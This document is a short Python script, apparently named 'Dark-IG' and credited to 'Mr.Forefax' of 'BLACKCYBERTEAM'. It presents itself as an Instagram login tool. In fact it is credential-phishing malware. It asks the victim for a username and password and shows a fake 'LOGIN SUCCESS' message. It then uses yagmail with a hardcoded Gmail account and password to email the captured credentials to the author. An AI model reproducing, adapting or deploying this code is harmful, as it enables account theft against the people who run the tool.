j# Dark-IG
# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('hayyukklah@gmail.com','yahahahayyukk')
subject='Hasil UwU Mr.Forefax'
logo = """
\033[37;1m██████╗  █████╗ ██████╗ ██╗  ██╗     ██╗███╗   █>
\033[37;1m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██║████╗  █>
\033[37;1m██║  ██║███████║██████╔╝█████╔╝█████╗██║██╔██╗ █>
\033[31;1m██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██║██║╚██╗█>
\033[31;1m██████╔╝██║  ██║██║  ██║██║  ██╗     ██║██║ ╚███>
\033[31;1m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚═╝  ╚══>
\033[33;1m●❯────────────────❮●●❯────────────────❮●●❯──────>
\033[36;1m                    AUTHOR : Mr.Forefax
\033[36;1m                    MY TEAM : BLACKCYBERTEAM
\033[36;1m                    𝚃𝙾𝙾𝙻𝚂 : 𝙳𝙰𝚁𝙺-FAXX
\033[33;1m●❯────────────────❮●●❯────────────────❮●●❯──────>

"""
banner = """
\x1b[32m ✓ login Instagram
\x1b[32m ✓ Please login with your account \x1b[91m!
"""
def main():
        os.system('clear')
        print(logo)
        print(banner)
        print('\x1b[00m\033[41m LOGIN ACCOUNT \033[00m')
        u=input('\x1b[00mUsername: \x1b[33m')
        p=input('\x1b[00mPassword: \x1b[33m')
        msg=('username: '+u+', password: '+p)
        body=(msg)
        print('')
        print('\x1b[00mWAINTING...\x1b[36m !\x1b[00m')
        os.system('sleep 4')
        print('\x1b[32mLOGIN SUCCESS...')
        os.system('sleep 4')
        os.system('clear')
        os.system('sleep 2')
        print('')
        print('\x1b[00mExiting program \x1b[91m!')
        os.system('exit')
        x.send('hayyukklah@gmail.com',subject,body)

main()
